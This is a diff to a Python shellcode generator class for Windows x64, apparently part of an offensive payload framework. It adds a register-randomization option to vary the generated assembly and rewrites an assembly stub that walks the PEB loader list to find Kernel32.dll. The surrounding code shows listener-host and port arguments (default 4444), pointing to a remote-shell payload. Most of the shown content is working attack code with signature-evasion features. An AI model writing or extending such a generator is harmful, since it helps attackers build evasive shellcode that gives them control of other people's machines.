@@ -48,12 +48,18 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
+    arguments["RREGS"] = {}
+    arguments["RREGS"]["optional"] = "yes"
+    arguments["RREGS"]["description"] = "Randomize registers"
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
-        arg_object["architecture"] = Shellcode.arch
         self.builder = Assembler(Shellcode.arch)
-        self.registers = Mappings(Shellcode.arch) # Experimental
+        self.map = Mappings(Shellcode.arch) # Experimental
+        self.randomize_regs = False # Experimental
+
+        arg_object["architecture"] = Shellcode.arch
 
         return
 
@@ -61,45 +67,49 @@ class Shellcode():
         """Generates stub for obtaining the base address of Kernel32.dll
         """
 
-        r64 = self.registers.gen_regs(5, 64)
-        print(r64)
-        exit()
+        if self.randomize_regs:
+            full_map = self.map.get_full_mapping()
+            rcx, r8, rdi, rax, rsi = self.map.gen_regs(5, 64)
+            cx = full_map[rcx][1]
+            dl = self.map.gen_regs(1, 8)[0]
+        else:
+            rcx, r8, rdi, rax, rsi, cx, dl = "rcx", "r8", "rdi", "rax", "rsi", "cx", "dl"
 
-        stub = """
+        stub = f"""
 ; DWORD64 getKernel32()
-; {
+; {{
 ;	 CHAR c = 'K';
 ;	 PPEB pPEB = (PPEB)__readgsqword(0x60);
 ;	 PPEB_LDR_DATA pLdrData = (PLDR_DATA_TABLE_ENTRY)pPEB->Ldr;
 ;	 DWORD64 pHeadEntry = ((DWORD64)((PLDR_DATA_TABLE_ENTRY)pPEB->Ldr->InInitializationOrderModuleList.Flink));
 ;
 ;	 PLIST_ENTRY pEntry = ((PLIST_ENTRY)pHeadEntry)->Flink;
-;	 while (1) {
+;	 while (1) {{
 ;		 PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((DWORD64)pEntry - 0x10);
-;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {
+;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {{
 ;			 return pLdrDataTableEntry->InInitializationOrderLinks.Flink;
-;		 }
+;		 }}
 ;
 ;		 pEntry = pEntry->Flink;
-;	 }
-; }
+;	 }}
+; }}
 
 getKernel32:
-    mov dl, 0x4b
+    mov {dl}, 0x4b
 getPEB:
-    mov rcx, 0x60
-    mov r8, gs:[rcx]
+    mov {rcx}, 0x60
+    mov {r8}, gs:[{rcx}]
 getHeadEntry:
-    mov rdi, [r8 + 0x18]
-    mov rdi, [rdi + 0x30]
+    mov {rdi}, [{r8} + 0x18]
+    mov {rdi}, [{rdi} + 0x30]
 search:
-    xor rcx, rcx
-    mov rax, [rdi + 0x10]
-    mov rsi, [rdi + 0x40]
-    mov rdi, [rdi]
-    cmp [rsi + 0x18], cx
+    xor {rcx}, {rcx}
+    mov {rax}, [{rdi} + 0x10]
+    mov {rsi}, [{rdi} + 0x40]
+    mov {rdi}, [{rdi}]
+    cmp [{rsi} + 0x18], {cx}
     jne search
-    cmp [rsi], dl
+    cmp [{rsi}], {dl}
     jne search
     ret
         """
@@ -239,6 +249,9 @@ error:
             lport = 4444
         else:
             lport = int(argv_dict["LPORT"])
+
+        if ("RREGS" in argv_dict.keys()):
+            self.randomize_regs = (argv_dict["RREGS"].lower() == "true")
 
 
         shellcode = """
